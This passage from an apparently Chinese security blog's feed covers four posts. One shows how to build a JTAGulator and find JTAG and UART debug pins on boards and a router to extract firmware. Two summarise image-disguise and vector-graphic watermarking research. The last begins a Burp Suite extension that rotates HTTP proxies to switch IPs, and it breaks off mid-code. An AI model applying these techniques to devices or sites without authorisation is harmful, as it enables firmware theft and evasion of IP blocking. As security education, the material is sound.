    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在线调试（OCD,On-Chip Debugging）接口可以提供对目标设备的芯片级控制，是工程师、研究人员、黑客用来提取程序固件代码或数据、修改存储器内容或改变设备操作的主要途径。如果你熟悉硬件电路或嵌入式系统，那么你肯定知道JTAG（Joint Test Action Group）和UART（Universal Asynchronous Receiver/Transmitter）可以说是使用最多的串行通信接口。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/1.png" alt="img"></p><p>JTAG规范没有标准的接口定义，所以你可以在各种PCB硬件上中见到4-20pin的JTAG Header，而且各个引脚的功能定义也无法确定，这给调试工作造成了很大的麻烦，下图列举了4种接口定义，有ARM公司的定义，有ST公司的定义等等。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/2.png" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/3.png" alt="img"></p><p>那如何知道引脚定义呢？传统的做法是通过逻辑分析仪做信号分析来解决，但是这样既费时费力又容易出错。于是自动化识别JTAG接口的设备便诞生了，例如有JTAGulator、JTAGenum、JTAG Finder、JTAG Pinout Tool等等，目前来说最好用的还是JTAGulator。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/4.png" alt="img"></p><p>JTAGulator是一个开源硬件工具，可用于识别目标设备上测试点、过孔或元件焊盘的OCD连接，进而可以使用Attify Badge接线并读取程序固件。</p><h2 id="JTAG规范"><a href="#JTAG规范" class="headerlink" title="JTAG规范"></a>JTAG规范</h2><p>JTAG是联合测试工作组（Joint Test Action Group）的简称，是在名为标准测试访问端口和边界扫描结构的IEEE的标准1149.1的常用名称。此标准用于验证设计与测试生产出的印刷电路板功能。</p><p>1990年JTAG正式由IEEE的1149.1-1990号文档标准化，在1994年，加入了补充文档对边界扫描描述语言（BSDL）进行了说明。从那时开始，这个标准被全球的电子企业广泛采用。边界扫描几乎成为了JTAG的同义词。</p><p>JTAG的主要三大功能：</p><ol><li>下载器，即下载程序固件到设备FLASH芯片。</li><li>DEBUG，类似于医生的听诊器，可以探听芯片内部的错误。</li><li>边界扫描，可以访问芯片内部的型号逻辑状态，还有芯片引脚的状态等等。</li></ol><p>在JTAG接口中，最常用的信号有五个，分别是TCK / TMS / TDO / TDI / TRST，其中4个是输入信号接口，另外1个是输出信号接口。</p><p>JTAG最初是用来对芯片进行测试的，其基本原理是在器件内部定义一个TAP（Test Access Port）并规定TAP状态机的行为，通过专用的测试工具进行内部节点进行测试。JTAG测试允许多个器件通过JTAG接口串联在一起，形成一个JTAG链，能实现对各个器件分别测试。现在，JTAG接口还常用于实现ISP（In-System Programmable），对Flash等器件进行编程。下面，我们介绍一下这5个接口：</p><ul><li>Test Clock Input (TCK)<br>TCK在IEEE1149.1标准里是强制要求的。TCK为TAP的操作提供了一个独立的、基本的时钟信号，TAP的所有操作都是通过这个时钟信号来驱动的。</li><li>Test Mode SelectionInput (TMS)<br>TMS信号在TCK的上升沿有效。TMS在IEEE1149.1标准里是强制要求的。TMS信号用来控制TAP状态机的转换。通过TMS信号，可以控制TAP在不同的状态间相互转换。</li><li>Test Data Input (TDI)<br>TDI在IEEE1149.1标准里是强制要求的。TDI是数据输入的接口。所有要输入到特定寄存器的数据都是通过TDI接口一位一位串行输入的（由TCK驱动）。</li><li>Test Data Output (TDO)<br>TDO在IEEE1149.1标准里是强制要求的。TDO是数据输出的接口。所有要从特定的寄存器中输出的数据都是通过TDO接口一位一位串行输出的（由TCK驱动）。</li><li>Test Reset Input (TRST)<br>这个信号接口在IEEE 1149.1标准里是可选的，并不是强制要求的。TRST可以用来对TAPController进行复位（初始化）。因为通过TMS也可以对TAP Controll进行复位（初始化）。所以有四线JTAG与五线JTAG之分。</li></ul><p>JTAG接口可以一对一的使用，也可以组成菊花链的一对多拓扑结构，两种拓扑结构如下图所示。多核的芯片，其芯片内部已经接成了菊花链的形式。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/5.png" alt="img"></p><h2 id="制作JTAGulator"><a href="#制作JTAGulator" class="headerlink" title="制作JTAGulator"></a>制作JTAGulator</h2><p>JTAGulator官方售价$169，某宝代购价人民币1500元左右，自己DIY成本可以控制在每块板子人民币500元以内。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/6.png" alt="img"></p><p>在<a href="http://www.grandideastudio.com/jtagulator/" target="_blank" rel="noopener">JTAGulator的官网</a>可以下载制作JTAGulator所需的所有资料，GERBER光绘文件，BOM元件列表等等。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/7.png" alt="img"></p><p>把GERBER光绘文件发往工厂打样PCB，等待2-3天即可到货，然后购买BOM表中的电子元器件。PCB我是在嘉立创打样，电子元件在立创商城购买。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/8.png" alt="img"></p><p>按照官网提供的PCB装配图将电子元器件用烙铁和焊锡焊接在PCB电路板上面。焊接完成后用洗板水清理松香和助焊剂的残留，在上电之前仔细检查是否存在虚焊和短路现象。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/9.png" alt="img"></p><p>通过Mini USB数据线连接电脑，打开“设备管理器”会看到一个串行通信端口。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/10.png" alt="img"></p><p>硬件测试没问题后在Github下载<a href="https://github.com/grandideastudio/jtagulator/releases" target="_blank" rel="noopener">程序固件源码</a>，给设备烧录程序固件需要安装芯片的烧录工具<a href="https://www.parallax.com/downloads/propeller-tool-software-windows-spin-assembly" target="_blank" rel="noopener">Propeller Tool</a>。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/11.png" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/12.png" alt="img"></p><p>将下载的程序固件源码解压出来，打开里面的”JTAGulator.eeprom”文件，点击”Load ARM”就可以烧录固件进板子。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/13.png" alt="img"></p><p>烧录完毕用串口调试工具打开JTAGulator对应的COM端口，波特路115200，按一下回车键，返回数据即可，”H”查看帮助，”I”查看版本。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/14.png" alt="img"></p><h2 id="JTAG识别"><a href="#JTAG识别" class="headerlink" title="JTAG识别"></a>JTAG识别</h2><p>用一块STM32开发板做测试，假装不知道它的引脚定义，板子单独供电，先用万用表测出GND引脚，然后把需要识别的引脚和GND引脚用杜邦线接到JTAGulator上。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/15.png" alt="img"></p><p>输入”J”进入JTAG模式，”V”设置电压，”I”是IDCODE扫描，然后设置通道范围，成功识别出引定义。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/16.png" alt="img"></p><h2 id="UART识别"><a href="#UART识别" class="headerlink" title="UART识别"></a>UART识别</h2><p>拿一台网件的路由器做测试，一样的步骤，先用万用表测出GND引脚，然后把剩下的脚接到JTAGulator上。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/17.png" alt="img"></p><p>成功识别出TX和RX引脚。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/18.png" alt="img"></p><p>还可以用JTAGulator通过UART串口调试路由器。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/19.png" alt="img"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>JTAGulator能够快速识别哪些引脚可能是JTAG，并找出这些引脚的顺序，在这里感谢作者Joe Grand开源这款硬件工具。</p><p>没有条件DIY的朋友可以尝试另一个比较便宜的方案JTAGenum，使用Arduino Nano开发板或树莓派烧录程序即可 。</p><p>JTAGulator和JTAGenum两者之间的差别是，JTAGulator硬件内置了电平转换和输入保护，就软件方面而言JTAGulator提供UART扫描，JTAGenum目前并不支持，JTAGulator还提供扫描未记录的JTAG接口功能，这也是JTAGenum目前不支持的功能。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/4/20.png" alt="img"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>1、联想全球安全实验室《JTAGulator的制作与固件读取（上）》<br>2、<a href="http://www.grandideastudio.com/jtagulator/" target="_blank" rel="noopener">http://www.grandideastudio.com/jtagulator/</a><br>3、<a href="https://github.com/grandideastudio/jtagulator" target="_blank" rel="noopener">https://github.com/grandideastudio/jtagulator</a><br>4、<a href="https://blog.csdn.net/beetleinv/article/details/86372466" target="_blank" rel="noopener">https://blog.csdn.net/beetleinv/article/details/86372466</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在线调试（OCD,On-Chip Debugging）接口可以提供对目标设备的芯片级控制，是工程师、研究人员、黑客用来提取程序固件代码或数据
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="JTAGulator" scheme="http://yaseng.org/tags/JTAGulator/"/>
    
      <category term="jtag" scheme="http://yaseng.org/tags/jtag/"/>
    
  </entry>
  
  <entry>
    <title>信息安全之信息伪装</title>
    <link href="http://yaseng.org/something-about-information-hiding.html"/>
    <id>http://yaseng.org/something-about-information-hiding.html</id>
    <published>2020-03-14T16:00:00.000Z</published>
    <updated>2020-04-17T07:52:33.781Z</updated>
    
    <content type="html"><![CDATA[<h2 id="伪装之道"><a href="#伪装之道" class="headerlink" title="伪装之道"></a>伪装之道</h2><p>《孙子兵法》“虚实篇”中提出“故形人而我无形，则我专而敌分”，即“示伪形于敌，而我之真形则藏而不露”，指出了“伪装”对促进战争制胜的重要作用。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/5/1.png" alt="img"></p><p>​    当然，伪装绝对是一个技术活 ……</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/5/2.png" alt="img"></p><h2 id="信息伪装"><a href="#信息伪装" class="headerlink" title="信息伪装"></a>信息伪装</h2><p>信息伪装就是将秘密信息隐藏于另一非机密的文件内容之中，其形式可以是任何一种数字媒体，如图像、声音、视频等等。信息伪装技术不同于传统的加密技术，密码仅仅隐藏了信息的内容，而信息伪装不但隐藏了信息的内容而且隐藏了信息的存在。</p><p>一般来说，信息伪装技术具有隐蔽性、安全性、对称性和可纠错性四大特性。信息伪装技术包含的内容范围十分广泛，可以分为伪装术、数字水印、数据隐藏和数据嵌入等。其中图像伪装术和图像数字水印是人们研究的重点。信息伪装是一门不断发展的学科，许多新的分支和技术都在不断地涌现。可视密码学就是其中的一种。这种技术在恢复秘密图像时不需要任何复杂的密码学计算,而是直接以人的视觉系统即可将秘密图像辩识出来,完全不同于传统的密码技术,在解密过程中须靠大量且复杂的技术才可解出真正的信息。图像伪装是一门技巧性学问, 目前正在实用化方向发展。</p><h2 id="可视密码学视角下的图像“加密”"><a href="#可视密码学视角下的图像“加密”" class="headerlink" title="可视密码学视角下的图像“加密”"></a>可视密码学视角下的图像“加密”</h2><p>受信息伪装思想的启发，提出一种可逆图像转换的图像加密方法。该方法可以将原始图像变换为大小相同的自由选择的目标图像。对于彩色图像，我们分别对颜色通道R, G, B进行相同的变换。因此，文章仅以灰度图像(一个通道)为例来描述该方法。对于原始图像I，我们从图像数据库中随机选择与I大小相同的目标图像J。</p><p>首先，我们将原始图像I和目标图像J分别分割成N个互不重叠的块，然后将I和J的块按(B1,T1)，…，(BN,TN)组成块对，其中Bi是I的一个原始块，Ti是J的对应目标块，1 ≤i ≤N。将Bi转换成Ti，其实是生成一个类似Ti的T’i。然后将目标图像J中的每个Ti替换为T’i，得到变换后的图像J’。最后利用可逆信息嵌入方法将一些辅助信息嵌入到J’中，生成最终的伪装图像，也可以称为加密图像E(I)。这些辅助信息对于从J’恢复到I是必要的，在被嵌入之前，这些辅助信息将被压缩并使用与接收者共享的密钥K加密，因此只有拥有K的接收者才能解密E(I)。</p><p>所提出的转换过程包括三个步骤:块配对、块转换和边信息嵌入。我们主要阐述前两个步骤，第三个步骤可以用任何传统的可逆水印或可逆信息隐藏方法实现。</p><h3 id=""><a href="#" class="headerlink" title=" "></a> </h3><h3 id="关键步骤一：块配对"><a href="#关键步骤一：块配对" class="headerlink" title="关键步骤一：块配对"></a><strong>关键步骤一：块配对</strong></h3><p>为了使变换后的图像J’看起来像目标图像J，我们希望每个变换后的块与目标块具有相近的均值(u)和标准差(SD)。因此，我们首先分别计算I和J的每个块的u和SD。设块B像素组成为 B={p1,p2，…，pn},则该块的均值(u)和标准差(SD)计算如下：</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/5/3.png" alt="img"></p><p>当原始图像与目标图像匹配时，我们希望两个SD最接近的图像块是一对。文献[1]中Lee等人的方法是将原始图像块和目标图像块分别按照它们的SD按升序排序，然后将每个原始块依次与对应的目标块按序配对。但是这种方法不可逆，也就是无法无损的还原原始图像。如果图像被分成N个块，则需要N[logN]比特来记录块索引。显然，块越小，变换后的图像质量就会越好，但是会导致一个很大的N。事实上，可能没有足够的冗余空间来存储这些额外的信息。因此，本文分块大小定为4×4。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/5/4.png" alt="img"></p><p>为了压缩块索引，我们首先根据块的SD值对它们进行分类，然后再对它们进行配对。事实上，如图1所示，统计来自BossBase图像数据库的10000张不同大小的图像，我们发现大多数的SD值集中在一个接近于零的小范围内。因此，我们将数据块分成两个不相等比例的类:SDs较小的数据块为0类，SDs较大的数据块为1类，并将属于同一类的数据块进行配对。通过将大多数块分配给类0，我们可以避免一对块之间的SDs的大偏差，同时有效地压缩索引。</p><h3 id="关键步骤二：块转换"><a href="#关键步骤二：块转换" class="headerlink" title="关键步骤二：块转换"></a><strong>关键步骤二：块转换</strong></h3><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/5/5.png" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/5/6.png" alt="img"></p><p>最后，为了尽可能地保持变换后的图像与目标图像之间的相似性，我们进一步将变换后的块旋转到0°、90°、180°或270°四个方向中的一个。选择最优方向，使旋转块与目标块之间的均方误差最小。</p><p>在变换和旋转之后，得到一个新的块T’。用这些新块替换相应目标图像的块并生成转换后的图像J’。参数Δu和旋转方向将被压缩，加密，然后嵌入转换后的图像J’作为边信息输出目标图像E (I)，这也可以作为一种加密图像。</p><h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><p>从BossBase图像数据库中随机选择10对图像作为我们的测试图像。首先对所有的图像进行预处理，得到大小相同的1024×1024像素。</p><p>如下图所示，展示了两张测试图像以及加密后的视觉效果。通过该方法得到的加密图像E(I)与目标图像相似，看起来像马赛克图像。由于加密后的图像与目标图像的差异较小，这种视觉效果能满足伪装的要求，即原始图像内容完全被目标图像内容所覆盖。即使攻击者识别出伪装，如果不知道加密算法与秘钥K，也不能恢复边信息，从而不能恢复图像。此外，边信息平均占用每个像素约0.521比特/像素元(bpp)。这对图像造成了较大的失真，但加密后的图像E(I)仍然可以保持一个较好的质量，其PSNR值大约等于30 dB，这是一个可以接受的视觉效果。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/5/7.png" alt="img"></p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>[1] Y. Lee and W. Tsai, “A new secure image transmission technique via secret-fragment-visible mosaic images by nearly reversible color transformation,” IEEE Trans. Circuits Syst. Video Technol., vol. 24, no. 4, pp. 695–703, Apr. 2014</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;伪装之道&quot;&gt;&lt;a href=&quot;#伪装之道&quot; class=&quot;headerlink&quot; title=&quot;伪装之道&quot;&gt;&lt;/a&gt;伪装之道&lt;/h2&gt;&lt;p&gt;《孙子兵法》“虚实篇”中提出“故形人而我无形，则我专而敌分”，即“示伪形于敌，而我之真形则藏而不露”，指出了“伪装”对促进战
      
    
    </summary>
    
      <category term="数据安全" scheme="http://yaseng.org/categories/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="信息伪装" scheme="http://yaseng.org/tags/%E4%BF%A1%E6%81%AF%E4%BC%AA%E8%A3%85/"/>
    
  </entry>
  
  <entry>
    <title>可完全分离的二维矢量图加密域鲁棒可逆水印算法（二）</title>
    <link href="http://yaseng.org/separable-robust-reversible-watermarking-in-encrypted-2d-vector-graphics-2.html"/>
    <id>http://yaseng.org/separable-robust-reversible-watermarking-in-encrypted-2d-vector-graphics-2.html</id>
    <published>2020-02-29T16:00:00.000Z</published>
    <updated>2020-04-20T09:24:30.233Z</updated>
    
    <content type="html"><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>随着云制造技术的兴起，加密域可逆水印技术逐渐受到了较多的关注。然而，现有的大部分算法不仅只能应用于图像、视频等冗余性较大的载体，而且难以抵御常见的攻击，甚至只能在单一的域中提取水印。为此，本文针对冗余性较小的二维矢量图提出了一种可完全分离的二维矢量图加密域鲁棒可逆水印算法。首先，内容拥有者在极坐标系下利用加密密钥置乱顶点的极角以加密图形。随后，水印嵌入者在嵌入密钥以及哈希函数的控制下，把编码后的水印比特映射到不同顶点，再轻微调整顶点极角从而嵌入水印。由于解密操作不会影响已嵌入的水印，算法可以分别在明文域或密文域提取水印。实验结果与分析表明，算法不仅具有较好的不可见性，而且能有效抵御旋转、平移、缩放（RST）、实体重排序等常见的操作，甚至还能抵御顶点或实体的增加、删除等恶意攻击。</p><h2 id="算法描述"><a href="#算法描述" class="headerlink" title="算法描述"></a>算法描述</h2><h3 id="水印提取与图形恢复"><a href="#水印提取与图形恢复" class="headerlink" title="水印提取与图形恢复"></a>水印提取与图形恢复</h3><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/3/1.png" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/3/2.png" alt="img"></p><h3 id="图形解密"><a href="#图形解密" class="headerlink" title="图形解密"></a>图形解密</h3><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/3/3.png" alt="img"></p><h2 id="实验结果与分析"><a href="#实验结果与分析" class="headerlink" title="实验结果与分析"></a>实验结果与分析</h2><h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/3/4.png" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/3/5.png" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/3/6.png" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/3/7.png" alt="img"></p><h2 id="性能分析"><a href="#性能分析" class="headerlink" title="性能分析"></a>性能分析</h2><h3 id="编码方案与容量分析"><a href="#编码方案与容量分析" class="headerlink" title="编码方案与容量分析"></a>编码方案与容量分析</h3><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/3/8.png" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/3/9.png" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/3/10.png" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/3/11.png" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/3/12.png" alt="img"></p><h3 id="图形加密的性能分析"><a href="#图形加密的性能分析" class="headerlink" title="图形加密的性能分析"></a>图形加密的性能分析</h3><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/3/13.png" alt="img"></p><h3 id="可逆性分析"><a href="#可逆性分析" class="headerlink" title="可逆性分析"></a>可逆性分析</h3><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/3/14.png" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/3/15.png" alt="img"></p><h3 id="直接解密对图形质量的影响分析"><a href="#直接解密对图形质量的影响分析" class="headerlink" title="直接解密对图形质量的影响分析"></a>直接解密对图形质量的影响分析</h3><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/3/16.png" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/3/17.png" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/3/18.png" alt="img"></p><h3 id="鲁棒性分析"><a href="#鲁棒性分析" class="headerlink" title="鲁棒性分析"></a>鲁棒性分析</h3><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/3/19.png" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/3/20.png" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/3/21.png" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/3/22.png" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/3/23.png" alt="img"></p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>本文针对数据相关性较低的二维矢量图提出了一个可完全分离的加密域鲁棒可逆水印算法。实验结果表明，提出的算法不但具有较好的不可见性，且能抵御较多常见的操作与攻击，其鲁棒性优于现有同类算法。而且据公开文献，该工作为基于二维矢量图加密域可逆信息隐藏双域提取算法中的第一个工作。然而需要指出的是，提出的算法所依赖的参考点容易成为攻击者的目标从而使得算法失效。后续研究除了会继续改善该算法外，还将继续研究鲁棒可逆水印的相关理论与方法。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;摘要&quot;&gt;&lt;a href=&quot;#摘要&quot; class=&quot;headerlink&quot; title=&quot;摘要&quot;&gt;&lt;/a&gt;摘要&lt;/h2&gt;&lt;p&gt;随着云制造技术的兴起，加密域可逆水印技术逐渐受到了较多的关注。然而，现有的大部分算法不仅只能应用于图像、视频等冗余性较大的载体，而且难以抵御
      
    
    </summary>
    
      <category term="数据安全" scheme="http://yaseng.org/categories/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="加密域可逆水印" scheme="http://yaseng.org/tags/%E5%8A%A0%E5%AF%86%E5%9F%9F%E5%8F%AF%E9%80%86%E6%B0%B4%E5%8D%B0/"/>
    
      <category term="鲁棒可逆水印" scheme="http://yaseng.org/tags/%E9%B2%81%E6%A3%92%E5%8F%AF%E9%80%86%E6%B0%B4%E5%8D%B0/"/>
    
  </entry>
  
  <entry>
    <title>强化 web 攻击神器 Burp Suite (二) — 切换 ip 技能点</title>
    <link href="http://yaseng.org/burp-suite-ip-switch-extension.html"/>
    <id>http://yaseng.org/burp-suite-ip-switch-extension.html</id>
    <published>2020-02-28T16:00:00.000Z</published>
    <updated>2020-04-16T05:40:46.985Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上篇文章给 Burp Suite 添加验证码识别技能点，对于现代化的渗透测试神器来说，自动化切换 ip 也是必备技能，本文通过动态设置 HTTP 代理来完善此功能。</p><h2 id="快速开发"><a href="#快速开发" class="headerlink" title="快速开发"></a>快速开发</h2><h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>对于 HTTP 代理，HTTP 客户端向代理发送请求报文，代理服务器需要正确地处理请求和连接（例如正确处理 Connection: keep-alive），同时向服务器发送请求，并将收到的响应转发给客户端。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/1/15861583094704.jpg" alt="img"></p><p>图片来源:《HTTP 权威指南》</p><p>原理较为简单，具体看数据包对比<br>正常访问</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/1/15861929435991.jpg" alt="img"></p><p>http 流</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: myip.ipip.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:69.0) Gecko/20100101 Firefox/69.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Mon, 01 Apr 2020 16:58:35 GMT</span><br><span class="line">Content-Type: text/plain; charset=utf-8</span><br><span class="line">Content-Length: 67</span><br><span class="line">Connection: keep-alive</span><br><span class="line">...... IP...113.*.*.*  .................. ...... ......  ......</span><br></pre></td></tr></table></figure><p>代理访问<br>HTTP 代理 180.143.244.66:18637</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/4/1/15861937338716.jpg" alt="img"></p><p>http 流</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">GET http://myip.ipip.net/ HTTP/1.1</span><br><span class="line">Host: myip.ipip.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:69.0) Gecko/20100101 Firefox/69.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Mon, 01 Apr 2020 17:18:45 GMT</span><br><span class="line">Content-Type: text/plain; charset=utf-8</span><br><span class="line">Content-Length: 69</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">...... IP...180.143.244.66  .................. ...... ......  ......</span><br></pre></td></tr></table></figure><p>可以看到正常访问和代理访问在数据层就是请求路径和目标不同。使用代理就是把数据带上目标信息先发送到代理服务器，要在 Burp Suite 中实现代理功能，动态修改请求目标和请求 header 即可 。</p><h3 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h3><p>参考官方文档，修改 HTTP 请求，需要在脚本中实例化 IHttpListener 类并重写 processHttpMessage 方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">HTTP_PROXY=&#123;</span><br><span class="line">    <span class="string">'ip'</span>:<span class="string">'14.118.163.95'</span>,</span><br><span class="line">    <span class="string">'port'</span>:<span class="number">19048</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BurpExtender</span><span class="params">(IBurpExtender, IHttpListener)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">registerExtenderCallbacks</span><span 